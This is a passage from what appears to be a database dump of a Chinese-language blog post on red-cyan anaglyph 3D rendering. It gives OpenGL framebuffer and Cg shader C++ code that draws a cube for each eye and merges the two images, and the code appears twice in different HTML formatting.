glFramebufferTexture2DEXT(GL_FRAMEBUFFER_EXT, GL_COLOR_ATTACHMENT0_EXT, GL_TEXTURE_2D, fboRight, 0);<br />&nbsp;&nbsp;&nbsp; glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT );<br />&nbsp;&nbsp;&nbsp; drawCube(1.0,1.0, 1.0);<br />}<br />void lr2Final(){<br />&nbsp;&nbsp;&nbsp; glFramebufferTexture2DEXT(GL_FRAMEBUFFER_EXT, GL_COLOR_ATTACHMENT0_EXT, GL_TEXTURE_2D, fboFinal, 0);<br /><br />&nbsp;&nbsp;&nbsp; glLoadIdentity();<br />&nbsp;&nbsp;&nbsp; glMatrixMode(GL_PROJECTION);<br />&nbsp;&nbsp;&nbsp; glLoadIdentity();<br />&nbsp;&nbsp;&nbsp; gluOrtho2D(0, 1, 0, 1);<br />&nbsp;&nbsp;&nbsp; glMatrixMode(GL_MODELVIEW);<br />&nbsp;&nbsp;&nbsp; glLoadIdentity();<br /><br />&nbsp;&nbsp;&nbsp; cgGLEnableProfile(vertexProfile);<br />&nbsp;&nbsp;&nbsp; cgGLEnableProfile(fragmentProfile);<br />&nbsp;&nbsp;&nbsp; float off2tex = off3d*zoomRate*2/dist3d;<br />&nbsp;&nbsp;&nbsp; cgGLSetParameter3fv(cgGetNamedParameter(fragmentProgram,\"off3d\"), &amp;off2tex);//透明色<br />&nbsp;&nbsp;&nbsp; setCgTexParam(\"texLeft\",fboLeft,fragmentProgram);//纹理<br />&nbsp;&nbsp;&nbsp; setCgTexParam(\"texRight\", fboRight, fragmentProgram);<br />&nbsp;&nbsp;&nbsp; glBegin(GL_QUADS);&nbsp;&nbsp; //画四边形<br />&nbsp;&nbsp;&nbsp; glTexCoord2f(-1,-1); <br />&nbsp;&nbsp;&nbsp; glVertex2f(-1,-1);<br />&nbsp;&nbsp;&nbsp; glTexCoord2f(-1, 1); <br />&nbsp;&nbsp;&nbsp; glVertex2f(-1, 1);<br />&nbsp;&nbsp;&nbsp; glTexCoord2f(1, 1); <br />&nbsp;&nbsp;&nbsp; glVertex2f(1, 1);<br />&nbsp;&nbsp;&nbsp; glTexCoord2f(1,-1); <br />&nbsp;&nbsp;&nbsp; glVertex2f(1,-1);<br />&nbsp;&nbsp;&nbsp; glEnd();&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; cgGLDisableProfile(vertexProfile);<br />&nbsp;&nbsp;&nbsp; cgGLDisableProfile(fragmentProfile);<br />}<br />void screen3d(void){&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; glLoadIdentity();<br />&nbsp;&nbsp;&nbsp; glMatrixMode(GL_PROJECTION);<br />&nbsp;&nbsp;&nbsp; glLoadIdentity();<br />&nbsp;&nbsp;&nbsp; gluOrtho2D(0, 1, 0, 1);<br />&nbsp;&nbsp;&nbsp; glMatrixMode(GL_MODELVIEW);<br />&nbsp;&nbsp;&nbsp; glLoadIdentity();<br /><br />&nbsp;&nbsp;&nbsp; glBindTexture(GL_TEXTURE_2D,fboFinal);<br />&nbsp;&nbsp;&nbsp; glClear( GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT );<br />&nbsp;&nbsp;&nbsp; glEnable(GL_TEXTURE_2D);&nbsp;&nbsp;&nbsp; //启用二维画图<br />&nbsp;&nbsp;&nbsp; glDisable(GL_DEPTH_TEST);//停用深度测试，因为这里用的二维&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; glBegin(GL_QUADS);&nbsp;&nbsp; //画四边形<br />&nbsp;&nbsp;&nbsp; glTexCoord2f(0,0); <br />&nbsp;&nbsp;&nbsp; glVertex2f(0,0);<br />&nbsp;&nbsp;&nbsp; glTexCoord2f(0, 1); <br />&nbsp;&nbsp;&nbsp; glVertex2f(0, 1);<br />&nbsp;&nbsp;&nbsp; glTexCoord2f(1, 1); <br />&nbsp;&nbsp;&nbsp; glVertex2f(1, 1);<br />&nbsp;&nbsp;&nbsp; glTexCoord2f(1,0); <br />&nbsp;&nbsp;&nbsp; glVertex2f(1,0);<br />&nbsp;&nbsp;&nbsp; glEnd();&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; glEnable(GL_DEPTH_TEST);//启用深度测试<br />&nbsp;&nbsp;&nbsp; glDisable(GL_TEXTURE_2D);&nbsp;&nbsp;&nbsp; //停用二维画图<br />}<br /><br />//产生FBO<br />void gen3dFBO(){<br />&nbsp;&nbsp;&nbsp; glGenFramebuffersEXT(1, &amp;frameBuffer);<br />&nbsp;&nbsp;&nbsp; glBindFramebufferEXT(GL_FRAMEBUFFER_EXT,frameBuffer); //now time i know how to blind the buffer to <br />&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; glGenRenderbuffersEXT(1, &amp;renderBuffer); //create reander buffer.<br />&nbsp;&nbsp;&nbsp; glBindRenderbufferEXT(GL_RENDERBUFFER_EXT, renderBuffer);<br />&nbsp;&nbsp;&nbsp; glRenderbufferStorageEXT(GL_RENDERBUFFER_EXT, GL_DEPTH_COMPONENT, width, height);<br />&nbsp;&nbsp;&nbsp; glFramebufferRenderbufferEXT(GL_FRAMEBUFFER_EXT, GL_DEPTH_ATTACHMENT_EXT, GL_RENDERBUFFER_EXT, renderBuffer);<br />&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; //FBO Left<br />&nbsp;&nbsp;&nbsp; glGenTextures(1, &amp;fboLeft);<br />&nbsp;&nbsp;&nbsp; glBindTexture(GL_TEXTURE_2D, fboLeft);<br />&nbsp;&nbsp;&nbsp; glTexEnvi(GL_TEXTURE_ENV, GL_TEXTURE_ENV_MODE, GL_REPLACE);<br />&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);<br />&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);<br />&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_BORDER);<br />&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_BORDER);<br />&nbsp;&nbsp;&nbsp; glTexImage2D(GL_TEXTURE_2D, 0,GL_RGBA16F_ARB, width, height, 0, GL_RGBA, GL_FLOAT, NULL);<br />&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; //FBO Right<br />&nbsp;&nbsp;&nbsp; glGenTextures(1, &amp;fboRight);<br />&nbsp;&nbsp;&nbsp; glBindTexture(GL_TEXTURE_2D, fboRight);<br />&nbsp;&nbsp;&nbsp; glTexEnvi(GL_TEXTURE_ENV, GL_TEXTURE_ENV_MODE, GL_REPLACE);<br />&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);<br />&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);<br />&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_BORDER);<br />&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_BORDER);<br />&nbsp;&nbsp;&nbsp; glTexImage2D(GL_TEXTURE_2D, 0,GL_RGBA16F_ARB, width, height, 0, GL_RGBA, GL_FLOAT, NULL);<br />&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; //最终显示到屏幕时用的纹理<br />&nbsp;&nbsp;&nbsp; glGenTextures(1, &amp;fboFinal);<br />&nbsp;&nbsp;&nbsp; glBindTexture(GL_TEXTURE_2D, fboFinal);<br />&nbsp;&nbsp;&nbsp; glTexEnvi(GL_TEXTURE_ENV, GL_TEXTURE_ENV_MODE, GL_REPLACE);<br />&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);<br />&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);<br />&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_BORDER);<br />&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_BORDER);<br />&nbsp;&nbsp;&nbsp; glTexImage2D(GL_TEXTURE_2D, 0,GL_RGBA16F_ARB, width, height, 0, GL_RGBA, GL_FLOAT, NULL);<br />}<br />void initCG(){<br />&nbsp;&nbsp;&nbsp; glewInit();<br />&nbsp;&nbsp;&nbsp; CGcontext context = cgCreateContext();<br />&nbsp;&nbsp;&nbsp; vertexProfile = CG_PROFILE_ARBVP1;<br />&nbsp;&nbsp;&nbsp; fragmentProfile = CG_PROFILE_ARBFP1;<br />&nbsp;&nbsp;&nbsp; loadCgProgram(\"lr2final.cg\", context, vertexProgram, fragmentProgram, vertexProfile, fragmentProfile);<br />}<br />void drawCube(float x, float y, float z){<br />&nbsp;&nbsp;&nbsp; glBegin(GL_QUADS);<br />&nbsp;&nbsp;&nbsp; /* Back side */<br />&nbsp;&nbsp;&nbsp; glNormal3f(0.0, 0.0, -1.0); //表示前向面的法线<br />&nbsp;&nbsp;&nbsp; vertex(0.0, 0.0, 0.0); <br />&nbsp;&nbsp;&nbsp; glVertex3f(-1,-1,-1);<br /><br />&nbsp;&nbsp;&nbsp; vertex(0.0, y, 0.0);<br />&nbsp;&nbsp;&nbsp; glVertex3f(-1,y,-1);<br /><br />&nbsp;&nbsp;&nbsp; vertex(x, y, 0.0);<br />&nbsp;&nbsp;&nbsp; glVertex3f(x,y,-1);<br /><br />&nbsp;&nbsp;&nbsp; vertex(x, 0.0, 0.0);<br />&nbsp;&nbsp;&nbsp; glVertex3f(x,-1,-1);<br /><br />&nbsp;&nbsp;&nbsp; /* Front side */<br />&nbsp;&nbsp;&nbsp; glNormal3f(0.0, 0.0, 1.0);<br />&nbsp;&nbsp;&nbsp; vertex(0.0, 0.0, z);<br />&nbsp;&nbsp;&nbsp; glVertex3f(-1,-1,z);<br /><br />&nbsp;&nbsp;&nbsp; vertex(x, 0.0, z);<br />&nbsp;&nbsp;&nbsp; glVertex3f(x,-1,z);<br />&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; vertex(x, y, z);<br />&nbsp;&nbsp;&nbsp; glVertex3f(x,y,z);<br /><br />&nbsp;&nbsp;&nbsp; vertex(0.0, y, z);<br />&nbsp;&nbsp;&nbsp; glVertex3f(-1,y,z);<br />&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; /* Top side */<br />&nbsp;&nbsp;&nbsp; glNormal3f(0.0, 1.0, 0.0);<br />&nbsp;&nbsp;&nbsp; vertex(0.0, y, 0.0);<br />&nbsp;&nbsp;&nbsp; glVertex3f(-1,y,-1);<br /><br />&nbsp;&nbsp;&nbsp; vertex(0.0, y, z);<br />&nbsp;&nbsp;&nbsp; glVertex3f(-1,y,z);<br />&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; vertex(x, y, z);<br />&nbsp;&nbsp;&nbsp; glVertex3f(x,y,z);<br />&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; vertex(x, y, 0.0);<br />&nbsp;&nbsp;&nbsp; glVertex3f(x,y,-1);<br /><br />&nbsp;&nbsp;&nbsp; /* Bottom side */<br />&nbsp;&nbsp;&nbsp; glNormal3f(0.0, -1.0, 0.0);<br /><br />&nbsp;&nbsp;&nbsp; vertex(0.0, 0.0, 0.0);<br />&nbsp;&nbsp;&nbsp; glVertex3f(-1,-1,-1);<br />&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; vertex(x, 0.0, 0.0);<br />&nbsp;&nbsp;&nbsp; glVertex3f(x,-1,-1);<br />&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; vertex(x, 0.0, z);<br />&nbsp;&nbsp;&nbsp; glVertex3f(x,-1,z);<br />&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; vertex(0.0, 0.0, z);<br />&nbsp;&nbsp;&nbsp; glVertex3f(-1,-1,z);<br /><br />&nbsp;&nbsp;&nbsp; /* Left side */<br />&nbsp;&nbsp;&nbsp; glNormal3f(-1.0, 0.0, 0.0);<br />&nbsp;&nbsp;&nbsp; vertex(0.0, 0.0, 0.0);<br />&nbsp;&nbsp;&nbsp; glVertex3f(-1,-1,-1);<br /><br />&nbsp;&nbsp;&nbsp; vertex(0.0, 0.0, z);<br />&nbsp;&nbsp;&nbsp; glVertex3f(-1,-1,z);<br />&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; vertex(0.0, y, z);<br />&nbsp;&nbsp;&nbsp; glVertex3f(-1,y,z);<br />&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp; vertex(0.0, y, 0.0);<br />&nbsp;&nbsp;&nbsp; glVertex3f(-1,y,-1);<br /><br />&nbsp;&nbsp;&nbsp; /* Right side */<br />&nbsp;&nbsp;&nbsp; glNormal3f(1.0, 0.0, 0.0);<br />&nbsp;&nbsp;&nbsp; vertex(x, 0.0, 0.0);<br />&nbsp;&nbsp;&nbsp; glVertex3f(x,-1,-1);<br />&nbsp;&nbsp;&nbsp; vertex(x, y, 0.0);<br />&nbsp;&nbsp;&nbsp; glVertex3f(x,y,-1);<br />&nbsp;&nbsp;&nbsp; vertex(x, y, z);<br />&nbsp;&nbsp;&nbsp; glVertex3f(x,y,z);<br />&nbsp;&nbsp;&nbsp; vertex(x, 0.0, z);<br />&nbsp;&nbsp;&nbsp; glVertex3f(x,-1,z);<br />&nbsp;&nbsp;&nbsp; glEnd();&nbsp;&nbsp;&nbsp; <br />}<br />void vertex(float x, float y, float z) //pass<br />{<br />&nbsp;&nbsp;&nbsp; glColor3f(x,y,z);<br />&nbsp;&nbsp;&nbsp; glMultiTexCoord3fARB(GL_TEXTURE1_ARB, x, y, z);//这个是给索引纹理类容用的呀，我怎么能忘记喃<br />}',1,1,1,0,0,0,'理论上比较简单1. 生成左眼图片2. 生成右眼图片3. 合成两张图片具体步骤如下：1.将模型右移若干距离2. 绑定FBO1，将图像画到fboLeft上3. 将模型左移若干距离4. 绑定FBO2，将图像画到fboRight上5. 绑定FBO3，将fboLeft和fboRight作为纹理进行渲染6. fboLeft 的纹理位置右移，fboRight 的纹理位置左移，7. 然后取fboLeft颜色的R值，与fboRight的G值与B值8. 将FBO3的作为纹理，绘制到屏幕上。主要代码如下：cg代码：lr2final.cgvoid main_v(&nbsp;&nbsp;&nbsp; in float2 pos : POSITION,&nbsp;&nbsp;&nbsp; out float4 oPos : POSITION,&nbsp;&nbsp;&nbsp; out float4 coord: TEXCOORD){&nbsp;&nbsp;&nbsp; oPos = float4(pos, 0, 1);&nbsp;&nbsp;&nbsp; coord =&nbsp;&nbsp; (oPos+float4(1,1,0,0))/2;}void main_f(&nbsp;&nbsp;&nbsp; in float4 pos: POSITION,&nbsp;&nbsp;&nbsp; in float4 coord: TEXCOORD,&nbsp;&nbsp;&nbsp; out float4 color: COLOR,&nbsp;&nbsp;&nbsp; uniform sampler2D texLeft,&nbsp;&nbsp;&nbsp; uniform sampler2D texRight,&nbsp;&nbsp;&nbsp; uniform float off3d){&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; float4 leftPos = float4(coord.x+off3d, coord.yzw);&nbsp;&nbsp;&nbsp; float4 rightPos = float4(coord.x-off3d, coord.yzw);&nbsp;&nbsp;&nbsp; float4 leftColor = tex2D(texLeft, leftPos.xy);&nbsp;&nbsp;&nbsp; float4 rightColor = tex2D(texRight, rightPos.xy);&nbsp;&nbsp;&nbsp; //color = rightColor;&nbsp;&nbsp;&nbsp; color = float4(leftColor.r, rightColor.g, rightColor.b, 1);}C++代码: run3d.cpp#include &lt;GL/glew.h&gt;#include &lt;GL/glut.h&gt;#include &lt;CG/cg.h&gt;#include &lt;CG/cgGL.h&gt;#include &lt;windows.h&gt;#define NULL 0GLuint frameBuffer, renderBuffer, fboLeft, fboRight, fboFinal;CGprofile vertexProfile, fragmentProfile;CGprogram vertexProgram, fragmentProgram;float zoomRate = 0.8;float angle = 40.0;bool rotate3d = false;int width = 500, height = 500;float off3d = 0.5;float dist3d = 6;void display3d(void);void idle3d();void key3d(unsigned char key, int x, int y);void drawLeft();void drawRight();void lr2Final();void screen3d();void gen3dFBO();void init3d(int argc, char** argv);void initCG();void drawCube(float x, float y, float z);void vertex(float x, float y, float z);void setCgTexParam(char* paramName, GLuint tex,const CGprogram &amp;program) {//pass&nbsp;&nbsp;&nbsp; CGparameter param = cgGetNamedParameter(program, paramName); &nbsp;&nbsp;&nbsp; cgGLSetTextureParameter(param, tex); &nbsp;&nbsp;&nbsp; cgGLEnableTextureParameter(param);}void loadCgProgram(char * cgFile, CGcontext &amp;context, &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; CGprogram &amp;vProgram, CGprogram &amp;fProgram, CGprofile &amp;vProfile, CGprofile &amp;fProfile){&nbsp;&nbsp;&nbsp; vProgram = cgCreateProgramFromFile(context,&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; CG_SOURCE, cgFile,&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; vProfile, \"main_v\", 0);&nbsp;&nbsp;&nbsp; fProgram = cgCreateProgramFromFile(context,&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; CG_SOURCE, cgFile,&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; fProfile, \"main_f\", 0);&nbsp;&nbsp;&nbsp; if(!cgIsProgram(vProgram) || !cgIsProgram(fProgram))&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; oops(\"Create Cg Program Failed\");&nbsp;&nbsp;&nbsp; cgGLLoadProgram(vProgram);&nbsp;&nbsp;&nbsp; cgGLLoadProgram(fProgram);&nbsp;&nbsp;&nbsp; cgGLBindProgram(vProgram);&nbsp;&nbsp;&nbsp; cgGLBindProgram(fProgram);}int main(int argc, char** argv){&nbsp;&nbsp;&nbsp; init3d(argc, argv);&nbsp;&nbsp;&nbsp; glutDisplayFunc(display3d);&nbsp;&nbsp;&nbsp; glutIdleFunc(idle3d);&nbsp;&nbsp;&nbsp; glutKeyboardFunc(key3d);&nbsp;&nbsp;&nbsp; glutMainLoop();&nbsp;&nbsp;&nbsp; return 0;}//显示函数 void display3d(){&nbsp;&nbsp;&nbsp; //启用FBO&nbsp;&nbsp;&nbsp; glBindFramebufferEXT (GL_FRAMEBUFFER_EXT, frameBuffer);&nbsp;&nbsp;&nbsp; glBindRenderbufferEXT(GL_RENDERBUFFER_EXT, renderBuffer);&nbsp;&nbsp;&nbsp; //画左右眼到Buffer中&nbsp;&nbsp;&nbsp; drawLeft();&nbsp;&nbsp;&nbsp; drawRight();&nbsp;&nbsp;&nbsp; //合并左右眼到Buffer中&nbsp;&nbsp;&nbsp; lr2Final();&nbsp;&nbsp;&nbsp; //停用FBO&nbsp;&nbsp;&nbsp; glBindFramebufferEXT(GL_FRAMEBUFFER_EXT, 0);&nbsp;&nbsp;&nbsp; //将Buffer画到屏幕上&nbsp;&nbsp;&nbsp; screen3d();&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glutSwapBuffers();}void idle3d(){&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; static float lastTime&nbsp;&nbsp; = 0.0f;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // This will hold the time from the last frame&nbsp;&nbsp;&nbsp; float currentTime = GetTickCount() * 0.001f;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(rotate3d &amp;&amp; currentTime-lastTime&gt;0.04 ){&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; angle+=5;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; lastTime = currentTime;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glutPostRedisplay();&nbsp;&nbsp;&nbsp; }}void key3d(unsigned char k, int x, int y){&nbsp;&nbsp;&nbsp; switch(k){&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; case 27:&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; exit(0);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; case \'r\':&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; rotate3d = !rotate3d;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; break;&nbsp;&nbsp;&nbsp; }}//初始化void init3d(int argc, char** argv){&nbsp;&nbsp;&nbsp; glutInit(&amp;argc, argv);&nbsp;&nbsp;&nbsp; glutInitWindowSize(width,height);&nbsp;&nbsp;&nbsp; glutInitDisplayMode(GLUT_DOUBLE | GLUT_RGBA | GLUT_DEPTH);&nbsp;&nbsp;&nbsp; glutCreateWindow(\"3D\");&nbsp;&nbsp;&nbsp; initCG();&nbsp;&nbsp;&nbsp; gen3dFBO();}void setPos(float offset){&nbsp;&nbsp;&nbsp; //设置坐标&nbsp;&nbsp;&nbsp; glMatrixMode(GL_PROJECTION); //pass&nbsp;&nbsp;&nbsp; glLoadIdentity();&nbsp;&nbsp;&nbsp; glFrustum(-1,1, -1,1, 3, 9);&nbsp;&nbsp;&nbsp; glMatrixMode(GL_MODELVIEW); &nbsp;&nbsp;&nbsp; glLoadIdentity();&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glTranslated(-offset, 0, -dist3d);//平移&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glScalef(zoomRate, zoomRate, zoomRate);&nbsp;&nbsp;&nbsp; glRotatef(angle, 1, 0, 0);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }void drawLeft(){&nbsp;&nbsp;&nbsp; setPos(-off3d);&nbsp;&nbsp;&nbsp; glFramebufferTexture2DEXT(GL_FRAMEBUFFER_EXT, GL_COLOR_ATTACHMENT0_EXT, GL_TEXTURE_2D, fboLeft, 0);&nbsp;&nbsp;&nbsp; glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT );&nbsp;&nbsp;&nbsp; drawCube(1.0,1.0, 1.0);}void drawRight(){&nbsp;&nbsp;&nbsp; setPos(off3d);&nbsp;&nbsp;&nbsp; glFramebufferTexture2DEXT(GL_FRAMEBUFFER_EXT, GL_COLOR_ATTACHMENT0_EXT, GL_TEXTURE_2D, fboRight, 0);&nbsp;&nbsp;&nbsp; glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT );&nbsp;&nbsp;&nbsp; drawCube(1.0,1.0, 1.0);}void lr2Final(){&nbsp;&nbsp;&nbsp; glFramebufferTexture2DEXT(GL_FRAMEBUFFER_EXT, GL_COLOR_ATTACHMENT0_EXT, GL_TEXTURE_2D, fboFinal, 0);&nbsp;&nbsp;&nbsp; glLoadIdentity();&nbsp;&nbsp;&nbsp; glMatrixMode(GL_PROJECTION);&nbsp;&nbsp;&nbsp; glLoadIdentity();&nbsp;&nbsp;&nbsp; gluOrtho2D(0, 1, 0, 1);&nbsp;&nbsp;&nbsp; glMatrixMode(GL_MODELVIEW);&nbsp;&nbsp;&nbsp; glLoadIdentity();&nbsp;&nbsp;&nbsp; cgGLEnableProfile(vertexProfile);&nbsp;&nbsp;&nbsp; cgGLEnableProfile(fragmentProfile);&nbsp;&nbsp;&nbsp; float off2tex = off3d*zoomRate*2/dist3d;&nbsp;&nbsp;&nbsp; cgGLSetParameter3fv(cgGetNamedParameter(fragmentProgram,\"off3d\"), &amp;off2tex);//透明色&nbsp;&nbsp;&nbsp; setCgTexParam(\"texLeft\",fboLeft,fragmentProgram);//纹理&nbsp;&nbsp;&nbsp; setCgTexParam(\"texRight\", fboRight, fragmentProgram);&nbsp;&nbsp;&nbsp; glBegin(GL_QUADS);&nbsp;&nbsp; //画四边形&nbsp;&nbsp;&nbsp; glTexCoord2f(-1,-1); &nbsp;&nbsp;&nbsp; glVertex2f(-1,-1);&nbsp;&nbsp;&nbsp; glTexCoord2f(-1, 1); &nbsp;&nbsp;&nbsp; glVertex2f(-1, 1);&nbsp;&nbsp;&nbsp; glTexCoord2f(1, 1); &nbsp;&nbsp;&nbsp; glVertex2f(1, 1);&nbsp;&nbsp;&nbsp; glTexCoord2f(1,-1); &nbsp;&nbsp;&nbsp; glVertex2f(1,-1);&nbsp;&nbsp;&nbsp; glEnd();&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; cgGLDisableProfile(vertexProfile);&nbsp;&nbsp;&nbsp; cgGLDisableProfile(fragmentProfile);}void screen3d(void){&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glLoadIdentity();&nbsp;&nbsp;&nbsp; glMatrixMode(GL_PROJECTION);&nbsp;&nbsp;&nbsp; glLoadIdentity();&nbsp;&nbsp;&nbsp; gluOrtho2D(0, 1, 0, 1);&nbsp;&nbsp;&nbsp; glMatrixMode(GL_MODELVIEW);&nbsp;&nbsp;&nbsp; glLoadIdentity();&nbsp;&nbsp;&nbsp; glBindTexture(GL_TEXTURE_2D,fboFinal);&nbsp;&nbsp;&nbsp; glClear( GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT );&nbsp;&nbsp;&nbsp; glEnable(GL_TEXTURE_2D);&nbsp;&nbsp;&nbsp; //启用二维画图&nbsp;&nbsp;&nbsp; glDisable(GL_DEPTH_TEST);//停用深度测试，因为这里用的二维&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glBegin(GL_QUADS);&nbsp;&nbsp; //画四边形&nbsp;&nbsp;&nbsp; glTexCoord2f(0,0); &nbsp;&nbsp;&nbsp; glVertex2f(0,0);&nbsp;&nbsp;&nbsp; glTexCoord2f(0, 1); &nbsp;&nbsp;&nbsp; glVertex2f(0, 1);&nbsp;&nbsp;&nbsp; glTexCoord2f(1, 1); &nbsp;&nbsp;&nbsp; glVertex2f(1, 1);&nbsp;&nbsp;&nbsp; glTexCoord2f(1,0); &nbsp;&nbsp;&nbsp; glVertex2f(1,0);&nbsp;&nbsp;&nbsp; glEnd();&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glEnable(GL_DEPTH_TEST);//启用深度测试&nbsp;&nbsp;&nbsp; glDisable(GL_TEXTURE_2D);&nbsp;&nbsp;&nbsp; //停用二维画图}//产生FBOvoid gen3dFBO(){&nbsp;&nbsp;&nbsp; glGenFramebuffersEXT(1, &amp;frameBuffer);&nbsp;&nbsp;&nbsp; glBindFramebufferEXT(GL_FRAMEBUFFER_EXT,frameBuffer); //now time i know how to blind the buffer to &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; glGenRenderbuffersEXT(1, &amp;renderBuffer); //create reander buffer.&nbsp;&nbsp;&nbsp; glBindRenderbufferEXT(GL_RENDERBUFFER_EXT, renderBuffer);&nbsp;&nbsp;&nbsp; glRenderbufferStorageEXT(GL_RENDERBUFFER_EXT, GL_DEPTH_COMPONENT, width, height);&nbsp;&nbsp;&nbsp; glFramebufferRenderbufferEXT(GL_FRAMEBUFFER_EXT, GL_DEPTH_ATTACHMENT_EXT, GL_RENDERBUFFER_EXT, renderBuffer);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //FBO Left&nbsp;&nbsp;&nbsp; glGenTextures(1, &amp;fboLeft);&nbsp;&nbsp;&nbsp; glBindTexture(GL_TEXTURE_2D, fboLeft);&nbsp;&nbsp;&nbsp; glTexEnvi(GL_TEXTURE_ENV, GL_TEXTURE_ENV_MODE, GL_REPLACE);&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_BORDER);&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_BORDER);&nbsp;&nbsp;&nbsp; glTexImage2D(GL_TEXTURE_2D, 0,GL_RGBA16F_ARB, width, height, 0, GL_RGBA, GL_FLOAT, NULL);&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //FBO Right&nbsp;&nbsp;&nbsp; glGenTextures(1, &amp;fboRight);&nbsp;&nbsp;&nbsp; glBindTexture(GL_TEXTURE_2D, fboRight);&nbsp;&nbsp;&nbsp; glTexEnvi(GL_TEXTURE_ENV, GL_TEXTURE_ENV_MODE, GL_REPLACE);&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);&nbsp;&nbsp;&nbsp; glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, 